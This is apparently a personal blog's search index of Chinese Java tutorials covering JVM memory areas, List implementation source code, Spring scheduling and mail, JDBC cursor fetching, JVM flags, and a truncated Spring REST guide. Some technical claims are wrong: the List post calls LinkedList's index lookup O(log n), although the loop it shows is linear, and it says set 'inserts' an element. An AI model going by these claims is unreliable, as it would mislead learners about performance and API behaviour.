基于栈的指令的缺点在于完成相同的操作，指令数量通常要比基于寄存器的指令数量要多，基于栈的指令集是在内存中完成操作的，而基于寄存器的指令集是直接由CPU来执行的，它是在高速缓冲区中执行的，速度要快很多，虽然虚拟机可以采用一些优化手段，但总体来说，基于栈的指令集的执行速度要慢一些。 JVM 模块 虚拟机栈：Stack Frame 栈帧 程序计数器：Program Counter 本地方法栈：主要用于处理本地方法 堆（Heap）：JVM管理的最大一块内存空间 方法区（Method Area）：存储元数据。永久代（Permanent Generation），从JDK1.8开始，已经彻底废弃了永久代，使用元空间（Meta Space） 运行时常量池：方法区的一部分内容 直接内存：Direct Memory","categories":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"jvm","slug":"jvm","permalink":"https://xxzkid.github.io/tags/jvm/"}]},{"title":"List接口源码分析","slug":"list-source","date":"2019-04-14T15:47:46.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2019/list-source/","link":"","permalink":"https://xxzkid.github.io/2019/list-source/","excerpt":"了解基本数据结构在java中很是重要，今天在这里我们来常用的List接口，以及不同的实现。 ArrayList LinkedList Vector CopyOnWriteArrayList etc… 环境：JDK1.8","text":"了解基本数据结构在java中很是重要，今天在这里我们来常用的List接口，以及不同的实现。 ArrayList LinkedList Vector CopyOnWriteArrayList etc… 环境：JDK1.8 接口定义List接口定义分为：查询，修改，批量修改，比较和hash，位置访问，搜索，迭代，视图。 查询操作方法123456int size(); // 返回此列表元素数量boolean isEmpty(); // 返回此列表是否为空boolean contains(Object o); // 返回此列表是否包含o元素Iterator&lt;E&gt; iterator(); // 返回此列表迭代器Object[] toArray(); // 返回此列表转换后的数组&lt;T&gt; T[] toArray(T[] a); // 返回此列表转换后的数组范型 修改操作方法12boolean add(E e); // 添加元素到此列表中boolean remove(Object o); // 从此列表中移除指定元素 批量修改操作方法12345678boolean containsAll(Collection&lt;?&gt; c); // 是否包含指定列表所有元素boolean addAll(Collection&lt;? extends E&gt; c); // 添加指定集合所有元素到此列表中boolean addAll(int index, Collection&lt;? extends E&gt; c); // 从此列表指定index插入指定集合所有元素boolean removeAll(Collection&lt;?&gt; c); // 从此列表中删除指定集合中包含的所有元素boolean retainAll(Collection&lt;?&gt; c); // 仅保留此列表中包含在指定集合中的元素，相当于两个集合的交集default void replaceAll(UnaryOperator&lt;E&gt; operator)&#123;...&#125; // 按照指定一元操作替换此列表中所有元素, jdk8default void sort(Comparator&lt;? super E&gt; c) &#123;...&#125; // 按照指定比较器对此列表元素进行排序void clear(); // 清除此列表所有元素 比较和hash12boolean equals(Object o); // 比较两个列表是否相等int hashCode(); // 计算此列表的hash值 位置访问操作123E get(int index); // 从此列表中获取指定index元素E set(int index, E element); // 从此列表指定index插入指定元素E remove(int index); // 从此列表移除指定index元素 搜索操作12int indexOf(Object o); // 从前往后搜索指定元素的位置int lastIndexOf(Object o); // 从后往前搜索指定元素位置 列表迭代器12ListIterator&lt;E&gt; listIterator(); // 返回此列表中元素的列表迭代器ListIterator&lt;E&gt; listIterator(int index); // 从指定index返回此列表中元素的列表迭代器 视图12List&lt;E&gt; subList(int fromIndex, int toIndex); // 返回子列表视图default Spliterator&lt;E&gt; spliterator() &#123;...&#125; // 返回可分割迭代器 splitable iterator ArrayList实现首先ArrayList的默认容量为10 1private static final int DEFAULT_CAPACITY = 10; 其次定义了存储数据的数组以及数组中元素个数 12transient Object[] elementData;private int size; 从这里可以看出，我们的ArrayList底层是一个数组实现的。 我们再看看构造方法 123public ArrayList(int initialCapacity) &#123;...&#125; // 指定容量大小的构造器public ArrayList() &#123;...&#125; // 无参构造器public ArrayList(Collection&lt;? extends E&gt; c) &#123;...&#125; // 指定集合构造器 构造器干了些啥呢？ 其实很简单，就是一些数据初始化 初始化elementData 计算size大小，如果elementData为空，则size为默认值0 再来看看我们上面列的那些操作都干了啥？ 主要看add，remove，set 123456789boolean add(E e);public boolean add(E e) &#123; // 容量检查 ensureCapacityInternal(size + 1); // Increments modCount!! // 设置元素 elementData[size++] = e; return true;&#125; 计算elementData与最小容量size+1的大小 判断size+1与elementData.length大小，如果size+1 - elementData.length &lt; 0 则不扩容，否则扩容 存放对象到elementData数组中，size并增加 123456789101112131415161718192021E remove(int index);public E remove(int index) &#123; // index范围检查 rangeCheck(index); modCount++; // 获取index索引对应的元素 E oldValue = elementData(index); // 计算元素位置是否移动了，并调整元素位置 int numMoved = size - index - 1; if (numMoved &gt; 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); // 将最后一个元素设置为null elementData[--size] = null; // clear to let GC do its work // 返回index对应的元素 return oldValue;&#125; index范围检查 获取elementData中index位置的元素 计算index是否小于elementData.length-1，如果是则进行一次元素位置调整。并将最后一个元素设置为null. 12345678910111213E set(int index, E element);public E set(int index, E element) &#123; // index范围检查 rangeCheck(index); // 获取指定index的元素 E oldValue = elementData(index); // 覆盖index的元素为新元素 elementData[index] = element; // 返回旧值 return oldValue;&#125; index范围检查 获取指定index的元素，并覆盖旧元素为新元素 返回旧元素 LinkedList实现我们看看LinkedList属性 123transient int size = 0; // 元素个数transient Node&lt;E&gt; first; // 头节点transient Node&lt;E&gt; last; // 尾节点 我们再来看看Node是什么？ 1234567891011private static class Node&lt;E&gt; &#123; E item; Node&lt;E&gt; next; Node&lt;E&gt; prev; Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123; this.item = element; this.next = next; this.prev = prev; &#125;&#125; 这里我们可以看到LinkedList是使用Node节点实现，Node类似铁链的环一样，一个接着一个 再来看看构造器 12public LinkedList() &#123;&#125;public LinkedList(Collection&lt;? extends E&gt; c) &#123;...&#125; 指定集合构造器实际上是调用了addAll方法，这里我们直接从addAll说起 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public LinkedList(Collection&lt;? extends E&gt; c) &#123; this(); addAll(c);&#125;public boolean addAll(Collection&lt;? extends E&gt; c) &#123; return addAll(size, c);&#125;public boolean addAll(int index, Collection&lt;? extends E&gt; c) &#123; // 检查index范围 checkPositionIndex(index); Object[] a = c.toArray(); int numNew = a.length; if (numNew == 0) return false; // 找出当前节点，与前一个节点 Node&lt;E&gt; pred, succ; if (index == size) &#123; succ = null; pred = last; &#125; else &#123; succ = node(index); pred = succ.prev; &#125; // 追加节点 for (Object o : a) &#123; E e = (E) o; Node&lt;E&gt; newNode = new Node&lt;&gt;(pred, e, null); if (pred == null) first = newNode; else pred.next = newNode; pred = newNode; &#125; if (succ == null) &#123; // 更新最后一个节点 last = pred; &#125; else &#123; // 中间插入时，更新index节点的prev pred.next = succ; succ.prev = pred; &#125; size += numNew; modCount++; return true;&#125; 解释一下public boolean addAll(int index, Collection&lt;? extends E&gt; c) {…} 第一种情况： 当index == size大小时，从尾部添加。 第二种情况： 当index &lt; size大小时， 从中间插入。 我们依旧看看add，remove，set 1234567891011121314151617public boolean add(E e) &#123; linkLast(e); return true;&#125;// 在最后一个节点上追加节点void linkLast(E e) &#123; final Node&lt;E&gt; l = last; final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); last = newNode; if (l == null) first = newNode; else l.next = newNode; size++; modCount++;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344public boolean remove(Object o) &#123; if (o == null) &#123; for (Node&lt;E&gt; x = first; x != null; x = x.next) &#123; if (x.item == null) &#123; unlink(x); return true; &#125; &#125; &#125; else &#123; for (Node&lt;E&gt; x = first; x != null; x = x.next) &#123; if (o.equals(x.item)) &#123; unlink(x); return true; &#125; &#125; &#125; return false;&#125;E unlink(Node&lt;E&gt; x) &#123; // assert x != null; final E element = x.item; final Node&lt;E&gt; next = x.next; final Node&lt;E&gt; prev = x.prev; if (prev == null) &#123; first = next; &#125; else &#123; prev.next = next; x.prev = null; &#125; if (next == null) &#123; last = prev; &#125; else &#123; next.prev = prev; x.next = null; &#125; x.item = null; size--; modCount++; return element;&#125; 1234567public E set(int index, E element) &#123; checkElementIndex(index); Node&lt;E&gt; x = node(index); E oldVal = x.item; x.item = element; return oldVal;&#125; 这里还有一个Node node(int index); 这个主要是用来查询指定index的元素，时间复杂度为O(logn) 123456789101112131415Node&lt;E&gt; node(int index) &#123; // assert isElementIndex(index); if (index &lt; (size &gt;&gt; 1)) &#123; Node&lt;E&gt; x = first; for (int i = 0; i &lt; index; i++) x = x.next; return x; &#125; else &#123; Node&lt;E&gt; x = last; for (int i = size - 1; i &gt; index; i--) x = x.prev; return x; &#125;&#125; 从这里我们可以得出以下结论 ArrayList访问指定index的元素要比LinkedList快，看下面代码 1234ArrayList访问指定index的元素elementData[index]LinkedList访问指定index的元素node(index) Vector实现Vector则是在ArrayList的基础上所有方法增加了synchronized关键字，是线程安全的集合。 CopyOnWriteArrayList实现从名字可以看出CopyOnWriteArrayList的底层实现采用的数组，因为也是ArrayList。这个集合类也是线程安全的，那么我们来看看它是如何实现线程安全的。 首先在该类中增加了可重入锁 123final transient ReentrantLock lock = new ReentrantLock();private transient volatile Object[] array; // 数据存储 依旧，我们看看构造器 123456789101112131415161718192021222324public CopyOnWriteArrayList() &#123; setArray(new Object[0]);&#125;public CopyOnWriteArrayList(Collection&lt;? extends E&gt; c) &#123; Object[] elements; if (c.getClass() == CopyOnWriteArrayList.class) elements = ((CopyOnWriteArrayList&lt;?&gt;)c).getArray(); else &#123; elements = c.toArray(); // c.toArray might (incorrectly) not return Object[] (see 6260652) if (elements.getClass() != Object[].class) elements = Arrays.copyOf(elements, elements.length, Object[].class); &#125; setArray(elements);&#125;public CopyOnWriteArrayList(E[] toCopyIn) &#123; setArray(Arrays.copyOf(toCopyIn, toCopyIn.length, Object[].class));&#125;final void setArray(Object[] a) &#123; array = a;&#125; 上述构造器完成的就是array的初始化。 我们来看看是如何做到添加和获取做到线程安全的。 首先我们看看add方法 1234567891011121314public boolean add(E e) &#123; final ReentrantLock lock = this.lock; lock.lock(); try &#123; Object[] elements = getArray(); int len = elements.length; Object[] newElements = Arrays.copyOf(elements, len + 1); newElements[len] = e; setArray(newElements); return true; &#125; finally &#123; lock.unlock(); &#125;&#125; 这里可以看到，在添加新元素的时候会采用lock锁住当前方法。然后进行copy元素到新的数组中。 包括set，remove都进行了lock操作。 我们再看看get方法 1234567public E get(int index) &#123; return get(getArray(), index);&#125;private E get(Object[] a, int index) &#123; return (E) a[index];&#125; 看到没有，这里可没有加锁哦。我们再Vector中可以使用了synchronized关键字的。我们看看Vector的get。 123456public synchronized E get(int index) &#123; if (index &gt;= elementCount) throw new ArrayIndexOutOfBoundsException(index); return elementData(index);&#125; 在CopyOnWriteArrayList的get没有加锁是因为set的原因，在set的时候。每次都会生成一个新的数组，所以get时不用加锁。 这里可以看出CopyOnWriteArrayList的写性能应该不会太高。因为每次都要生成新的数组。 最后看看有哪些List是线程安全的 1231. 使用CopyOnWriteArrayList2. Collections.synchronizedList(new ArrayList())3. 使用Vector 好了，今天的分享就到这里啦。谢谢你的阅读，喜欢的话，可以打赏一下哦。","categories":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"}]},{"title":"决策树","slug":"decision_tree","date":"2019-02-14T20:27:07.000Z","updated":"2024-04-30T05:28:28.491Z","comments":true,"path":"2019/decision_tree/","link":"","permalink":"https://xxzkid.github.io/2019/decision_tree/","excerpt":"决策树","text":"决策树 熵=-\\sum_{i=1}^Np(i)log_2{p(i)} Gini系数=Gini(p)=\\sum_{k=1}^kp_k(1-p_k)=1-\\sum_{k=1}^kp_k^2熵越大，集合中的元素分类越多。 Gini系统与熵表达的意思一样。 Xgboost y_i=\\sum_jw_jx_{ij} 回归算法 决策树与随机森林 贝叶斯算法 Xgboost 支持向量机 时间序列 神经网络 PCA降维 聚类算法 推荐系统 word2vec","categories":[{"name":"ml","slug":"ml","permalink":"https://xxzkid.github.io/categories/ml/"}],"tags":[{"name":"ml","slug":"ml","permalink":"https://xxzkid.github.io/tags/ml/"},{"name":"机器学习","slug":"机器学习","permalink":"https://xxzkid.github.io/tags/机器学习/"},{"name":"决策树","slug":"决策树","permalink":"https://xxzkid.github.io/tags/决策树/"},{"name":"xgboost","slug":"xgboost","permalink":"https://xxzkid.github.io/tags/xgboost/"}]},{"title":"spring定时任务调度","slug":"spring-scheduling-tasks","date":"2018-01-03T22:54:21.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2018/spring-scheduling-tasks/","link":"","permalink":"https://xxzkid.github.io/2018/spring-scheduling-tasks/","excerpt":"本文将告诉你如何使用spring的任务调度。主要使用@Scheduled注解","text":"本文将告诉你如何使用spring的任务调度。主要使用@Scheduled注解 需要会使用maven 第一步 pom.xml配置12345678910111213141516171819202122232425262728293031323334353637383940&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.xxz&lt;/groupId&gt; &lt;artifactId&gt;scheduled-task-test&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.0.RELEASE&lt;/version&gt; &lt;/parent&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 第二步 定时任务类(ScheduledTasks)12345678910111213141516package org.xxz.task;import org.springframework.scheduling.annotation.Scheduled;import org.springframework.stereotype.Component;import lombok.extern.slf4j.Slf4j;@Slf4j@Componentpublic class ScheduledTasks &#123; @Scheduled(fixedRate = 5000) public void now() &#123; log.info(\"The time is now &#123;&#125;\", new Date()); &#125;&#125; @Scheduled有三种类型参数fixedRate, fixedDelay, cron fixedRate 表示每隔多少毫秒执行一次 fixedDelay 表示任务执行完成后隔多少毫秒执行一次 cron 定时任务表达式 第三步 启动类(Application)1234567891011121314package org.xxz;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.scheduling.annotation.EnableScheduling;@SpringBootApplication@EnableSchedulingpublic class Application &#123; public static void main(String[] args) throws Exception &#123; SpringApplication.run(Application.class); &#125;&#125; 第四步 打包运行123cd scheduled-task-testmvn clean packagejava -jar target/scheduled-task-test-1.0.jar 扩展知识：如果不想使用spring的任务调度，可以使用jdk自带的任务调度类 ScheduledExecutorService#schedule ScheduledExecutorService#scheduleAtFixedRate ScheduledExecutorService#scheduleWithFixedDelay 今天的分享就到这里了。谢谢阅读。","categories":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"spring-boot","slug":"spring-boot","permalink":"https://xxzkid.github.io/tags/spring-boot/"},{"name":"spring","slug":"spring","permalink":"https://xxzkid.github.io/tags/spring/"}]},{"title":"如何从数据库加载1000w数据","slug":"how-to-fetch-1000w-from-db","date":"2017-10-13T23:26:58.000Z","updated":"2024-04-30T05:28:28.491Z","comments":true,"path":"2017/how-to-fetch-1000w-from-db/","link":"","permalink":"https://xxzkid.github.io/2017/how-to-fetch-1000w-from-db/","excerpt":"这篇文章主要讲解 如何从数据库加载1000w数据 加载大量数据例子：将1000w的数据从数据库导入到redis中 在mysql中的实现方法：1、limit 分页 2、游标","text":"这篇文章主要讲解 如何从数据库加载1000w数据 加载大量数据例子：将1000w的数据从数据库导入到redis中 在mysql中的实现方法：1、limit 分页 2、游标 limit 分页问题： 当offset很大时，mysql需要做大量的文件排序操作，很影响性能。可以加上合适的 order by 子句，效率会有所改善。 游标问题： 默认mysql驱动加载游标数据是一次性把所有数据cache到java内存中，那么1000w的数据会导致java堆栈溢出。 在这里，我们可以在jdbc.url 添加一些参数来解决java堆栈溢出问题。 1jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?useUnicode=true&amp;characterEncoding=UTF-8&amp;useCursorFetch=true&amp;defaultFetchSize=1000 useCursorFetch：表示使用游标获取 defaultFetchSize：表示每次游标获取的大小 这两个参数主要针对mysql驱动版本在5.0.2以上可使用。 在oracle中是不需要使用这两个参数，因为oracle jdbc驱动默认实现是不将数据直接cache到java内存，在oracle 也可以直接使用分页 使用spring-batch需要注意的问题在使用spring-batch的JdbcCursorItemReader时，这个类默认会去校验cursor的位置，那么我们需要设置不校验 1reader.setVerifyCursorPosition(false);","categories":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"jdbc","slug":"jdbc","permalink":"https://xxzkid.github.io/tags/jdbc/"},{"name":"1000w","slug":"1000w","permalink":"https://xxzkid.github.io/tags/1000w/"},{"name":"cursor","slug":"cursor","permalink":"https://xxzkid.github.io/tags/cursor/"}]},{"title":"Java 启动参数","slug":"java-startup-arguments","date":"2017-09-06T08:30:02.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2017/java-startup-arguments/","link":"","permalink":"https://xxzkid.github.io/2017/java-startup-arguments/","excerpt":"这篇文章主要讲解 Java 启动参数在linux用jmeter做压力测试的时候，发现jmeter启动参数，记录一下： java -server -XX:+HeapDumpOnOutOfMemoryError -Xms512m -Xmx512m -XX:+UseG1GC -XX:MaxGCPauseMillis=250 -XX:G1ReservePercent=20 -Djava.security.egd=file:/dev/urandom -jar xxxx.jar 解释一下上述参数意思：","text":"这篇文章主要讲解 Java 启动参数在linux用jmeter做压力测试的时候，发现jmeter启动参数，记录一下： java -server -XX:+HeapDumpOnOutOfMemoryError -Xms512m -Xmx512m -XX:+UseG1GC -XX:MaxGCPauseMillis=250 -XX:G1ReservePercent=20 -Djava.security.egd=file:/dev/urandom -jar xxxx.jar 解释一下上述参数意思： -server 以Server模式启动，默认启动是以Client模式启动。JVM在client模式默认-Xms是1M，-Xmx是64M；JVM在Server模式默认-Xms是128M，-Xmx是1024M。我们可以通过运行:java -version来查看jvm默认工作在什么模式。 -XX:+HeapDumpOnOutOfMemoryError 设置堆栈内存溢出错误打印 -Xms512m 初始堆大小 -Xmx512m 最大堆大小 -XX:+UseG1GC 使用G1垃圾回收器 -XX:MaxGCPauseMillis=250 每次年轻代垃圾回收的最长时间(最大暂停时间) -XX:G1ReservePercent=20 为了降低晋升失败机率设置一个假的堆的储备空间的上限大小，默认值是10 -Djava.security.egd=file:/dev/urandom 非阻塞的随机数发生器，与之对应的 file:/dev/random 更多虚拟机参数请见《深入JVM虚拟机》 参考资料https://zybuluo.com/zhanggang807/note/107634https://zh.wikipedia.org/wiki//dev/random","categories":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"jvm","slug":"jvm","permalink":"https://xxzkid.github.io/tags/jvm/"},{"name":"jmeter","slug":"jmeter","permalink":"https://xxzkid.github.io/tags/jmeter/"}]},{"title":"spring boot 发送邮件","slug":"spring-boot-send-mail","date":"2017-09-02T04:41:23.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2017/spring-boot-send-mail/","link":"","permalink":"https://xxzkid.github.io/2017/spring-boot-send-mail/","excerpt":"这篇文章主要讲解 spring boot如何发送邮件 发送邮件是一个很常用的功能，比如线上故障告警，验证码等功能都会用到，下面我们来看看用spring mail 来实现发送邮件","text":"这篇文章主要讲解 spring boot如何发送邮件 发送邮件是一个很常用的功能，比如线上故障告警，验证码等功能都会用到，下面我们来看看用spring mail 来实现发送邮件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114package org.xxz.util;import java.io.File;import javax.mail.MessagingException;import javax.mail.internet.MimeMessage;import lombok.Getter;import lombok.Setter;import lombok.extern.slf4j.Slf4j;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.context.properties.ConfigurationProperties;import org.springframework.core.io.FileSystemResource;import org.springframework.mail.SimpleMailMessage;import org.springframework.mail.javamail.JavaMailSender;import org.springframework.mail.javamail.MimeMessageHelper;import org.springframework.stereotype.Component;@Slf4j@Component@ConfigurationProperties(prefix = \"mail\")public class MailUtil &#123; @Autowired private JavaMailSender sender; @Getter @Setter private String from; /** * 发送文本邮件 * @param to 接受人 * @param subject 主题 * @param text 文本 */ public void sendText(String to, String subject, String text) throws MessagingException &#123; log.info(\"===&gt;to:&#123;&#125;, subject:&#123;&#125;, text:&#123;&#125;\", to, subject, text); SimpleMailMessage message = new SimpleMailMessage(); message.setFrom(from); message.setTo(to); message.setSubject(subject); message.setText(text); sender.send(message); log.info(\"===&gt;send text mail finish\"); &#125; /** * 发送html邮件 * @param to * @param subject * @param text * @throws MessagingException */ public void sendHtml(String to, String subject, String text) throws MessagingException &#123; log.info(\"===&gt;to:&#123;&#125;, subject:&#123;&#125;, text:&#123;&#125;\", to, subject, text); MimeMessage message = sender.createMimeMessage(); MimeMessageHelper helper = new MimeMessageHelper(message, true); helper.setTo(to); helper.setFrom(from); helper.setSubject(subject); helper.setText(text, true); sender.send(message); log.info(\"===&gt;send html mail finish\"); &#125; /** * 发送附件邮件 * @param to * @param subject * @param text * @param filePath * @throws MessagingException */ public void sendAttachments(String to, String subject, String text, String filePath) throws MessagingException &#123; log.info(\"===&gt;to:&#123;&#125;, subject:&#123;&#125;, text:&#123;&#125;, filePath:&#123;&#125;\", to, subject, text, filePath); MimeMessage message = sender.createMimeMessage(); MimeMessageHelper helper = new MimeMessageHelper(message, true); helper.setTo(to); helper.setFrom(from); helper.setSubject(subject); helper.setText(text, true); FileSystemResource file = new FileSystemResource(new File(filePath)); String attachmentFilename = filePath.substring(filePath.lastIndexOf(File.separator) + 1); helper.addAttachment(attachmentFilename, file); sender.send(message); log.info(\"===&gt;send attachments mail finish\"); &#125; /** * 发送嵌入资源(一般是图片)邮件 * @param to * @param subject * @param text 带图片的邮件&lt;img src=\\\"cid:resId1\\\"&gt; * @param resPath 文件路径 * @param resId 静态资源id * @throws MessagingException */ public void sendInlineResource(String to, String subject, String text, String resPath, String resId) throws MessagingException &#123; log.info(\"===&gt;to:&#123;&#125;, subject:&#123;&#125;, text:&#123;&#125;, resPath:&#123;&#125;, resId:&#123;&#125;\", to, subject, text, resPath, resId); MimeMessage message = sender.createMimeMessage(); MimeMessageHelper helper = new MimeMessageHelper(message, true); helper.setTo(to); helper.setFrom(from); helper.setSubject(subject); helper.setText(text, true); FileSystemResource resource = new FileSystemResource(new File(resPath)); helper.addInline(resId, resource); sender.send(message); log.info(\"===&gt;send inline resource mail finish\"); &#125; &#125; 我们在看看配置文件怎么配置(application.properties) 123456789spring.mail.host=smtp-mail.outlook.comspring.mail.port=587spring.mail.username=你邮箱的用户名spring.mail.password=你邮箱的密码spring.mail.properties.mail.smtp.auth=truespring.mail.properties.mail.smtp.timeout=180000spring.mail.properties.mail.smtp.starttls.enable=truespring.mail.properties.mail.smtp.starttls.required=truemail.from=你邮箱的用户名 这里我用的是outlook host 根据不同邮件服务商进行修改 我们来看看测试类 123456789101112131415161718192021222324252627282930313233343536373839package org.xxz.util;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.test.context.junit4.SpringRunner;import org.xxz.blog.util.MailUtil;@RunWith(SpringRunner.class)@SpringBootTestpublic class MailUtilTest &#123; @Autowired MailUtil mailUtil; String to = \"修改成要接受邮件的邮箱地址\"; @Test public void testSendText() throws Exception &#123; mailUtil.sendText(to, \"测试text\", \"测试text\"); &#125; @Test public void testSendHtml() throws Exception &#123; mailUtil.sendHtml(to, \"测试html\", \"&lt;h1&gt;测试html&lt;/h1&gt;\"); &#125; @Test public void testSendAttachments() throws Exception &#123; mailUtil.sendAttachments(to, \"测试attachments\", \"测试attachments\", \"d:\\\\attachments.txt\"); &#125; @Test public void testSendInlineResource() throws Exception &#123; // 注意图片的src=cid:xxx 与后面的要对应 mailUtil.sendInlineResource(to, \"测试inlineResource\", \"测试inline resource&lt;img src=\\\"cid:001\\\"&gt;\", \"d:\\\\ihehe.jpg\", \"001\"); &#125;&#125;","categories":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"spring-boot","slug":"spring-boot","permalink":"https://xxzkid.github.io/tags/spring-boot/"},{"name":"mail","slug":"mail","permalink":"https://xxzkid.github.io/tags/mail/"}]},{"title":"spring-boot 构建一个restful的web服务","slug":"spring-boot-build-restful-web-service","date":"2016-11-24T00:00:00.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2016/spring-boot-build-restful-web-service/","link":"","permalink":"https://xxzkid.github.io/2016/spring-boot-build-restful-web-service/","excerpt":"构建一个restful的web服务这篇文章告诉你如何通过spring创建一个”hello world”的restful的web服务","text":"构建一个restful的web服务这篇文章告诉你如何通过spring创建一个”hello world”的restful的web服务 你会建立什么你会建立一个接受HTTP GET请求的服务：1http://localhost:8080/greeting 问候语以JSON的形式响应：1&#123;&quot;id&quot;:1,&quot;content&quot;:&quot;Hello, World!&quot;&#125; 你可以自定义问候语与一个可选 name 参数的查询字符串：1http://localhost:8080/greeting?name=User 这个name参数值覆盖默认的”World”，并反射到响应中：1&#123;&quot;id&quot;:1,&quot;content&quot;:&quot;Hello, User!&quot;&#125; 你需要什么 15分钟时间 一个你喜欢的文本编辑器或者IDE（集成开发环境） JDK 1.8或以上版本 Gradle 2.3+ 或者 Maven 3.0+ 你也可以从本指南中导入代码，以及查看该网页直接进入Spring Tool Suite(STS)，并通过它来进行工作。 如何完成本指南像大多数的 Spring Getting Started guides，你可以从头开始并完成每一个步骤，或者可以避开这个已经熟悉的基本设置步骤。无论以那种方式完成你的代码。 从头开始，请点击这里通过Gradle 跳过基础，进行如下操作： 下载并解压源代码，或者使用git克隆它：git clone https://github.com/spring-guides/gs-rest-service.git 进入 gs-rest-service/initial 直接跳到 创建资源类 当你完成，你可以检查你的结果和代码在gs-rest-service/complete 通过Gradle构建首先你先建立一个基本的构建脚本，您可以使用spring在任何你喜欢的构建系统上构建app，但你的code需要用Gradle和Maven来运行。如果你不熟悉，要么，请参阅通过Gradle构建Java项目 或者 通过Maven构建Java项目 创建目录结构在你选择的项目目录，创建如下的子目录结构，例子，在*nix系统通过 mkdir -p src/main/java/hello创建：1234└── src └── main └── java └── hello 创建Gradle构建文件下面是最初的构建文件 build.gradle123456789101112131415161718192021222324252627282930buildscript &#123; repositories &#123; mavenCentral() &#125; dependencies &#123; classpath(&quot;org.springframework.boot:spring-boot-gradle-plugin:1.4.1.RELEASE&quot;) &#125;&#125;apply plugin: &apos;java&apos;apply plugin: &apos;eclipse&apos;apply plugin: &apos;idea&apos;apply plugin: &apos;spring-boot&apos;jar &#123; baseName = &apos;gs-rest-service&apos; version = &apos;0.1.0&apos;&#125;repositories &#123; mavenCentral()&#125;sourceCompatibility = 1.8targetCompatibility = 1.8dependencies &#123; compile(&quot;org.springframework.boot:spring-boot-starter-web&quot;) testCompile(&apos;org.springframework.boot:spring-boot-starter-test&apos;)&#125; 这是Spring Boot gradle plugin 提供了许多快捷特性： 它收集的类路径上所有jar文件，并建立一个单一的可运行的jar，这使得它更方便地执行和传输你的服务 它搜索 public static void main()方法来标示可运行的类 它提供了一个内置的依赖解析器，用于设置版本号以匹配Spring Boot dependencies。您可以覆盖任何你想要的版本，但它会默认引导的选择版本。 通过Maven构建首先，你建立一个基本的构建脚本。你可以使用spring在任何你喜欢的构建系统上构建app，但是你的code必须通过Maven来运行，如果你还不熟悉Maven，请参阅Building Java Projects with Maven 创建目录结构在你选择的项目目录，创建如下子目录结构；例子，在 *nix 系统通过mkdir -p src/main/java/hello 创建：1234└── src └── main └── java └── hello pom.xml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;gs-rest-service&lt;/artifactId&gt; &lt;version&gt;0.1.0&lt;/version&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; 